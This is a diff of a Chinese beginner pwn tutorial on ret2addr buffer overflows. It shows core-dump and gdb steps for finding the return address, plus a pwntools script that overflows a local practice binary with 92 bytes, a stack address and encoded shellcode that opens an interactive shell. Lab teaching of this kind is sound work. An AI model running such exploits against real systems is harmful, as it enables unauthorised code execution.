@@ -2,7 +2,7 @@
 title:  Pwn 入门（ret2addr)
 permalink: pwn-ret2addr
 date: 2019-09-15 11:20:45
-tags: 
+tag: 
  - blog
  - Pwn
  - 网安
@@ -71,30 +71,43 @@ echo 0 > /proc/sys/kernel/randomize_va_space
 
 ## 2. 确定返回地址
 
-- 打开 core 转储功能 `ulimit -c unlimited`。
+- 打开 core 转储功能 
+
+  ```bash
+  ulimit -c unlimited
+  sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
+  ```
+
 - 运行程序，输入 上面获得的长度的无效字符串 + 4个任意字符（ESP）+ 4个任意字符（EIP）。此时程序会报错，然后把信息转储至 core 文件。
+
 - 用 `gdb 程序名称 core`打开 core 文件。
+
 - 此时ESP指向了所希望的 shellcode 的位置，也就是我们的自定义代码的位置。
+
+  ```sh
+  gdb-peda$ print $esp
+  0xffffcf80
+  ```
+
 - 此时EIP应该填充为 shellcode 的地址，即此时ESP的值。
 
 ## 3. 编写利用脚本
 
+shellcode 可以在 [shell-strom](http://shell-storm.org/shellcode/) 这里找到很多，也可以自己手写。
+
 ```python
 from pwn import *
-
-# context.log_level = 'debug'
-
-p = process("./vuln")
-
-payload = b'a' * 92
-
-payload += p32(0xffffd570)
-payload += b"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
-payload += b"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
-payload += b"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
-payload += b"\x32\xc1\x51\x69\x30\x30\x74\x69"
-payload += b"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
-payload += b"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
+#context.log_level='debug'
+p=process("./vuln") # 此处是程序的路径
+payload='a'*92	# 此处的92是第一步所确定的无效字符串的长度
+payload+=p32(0xffffcf80) #此处的地址是第二步时获得的 shellcode 地址
+#shellcode脚本
+payload+="\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
+payload+="\x6c\x0e\xff\x01\x80\xe9\x01\x75"
+payload+="\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+payload+="\x32\xc1\x51\x69\x30\x30\x74\x69"
+payload+="\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
+payload+="\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
 
 p.send(payload)
 p.interactive()#返回交互式界面
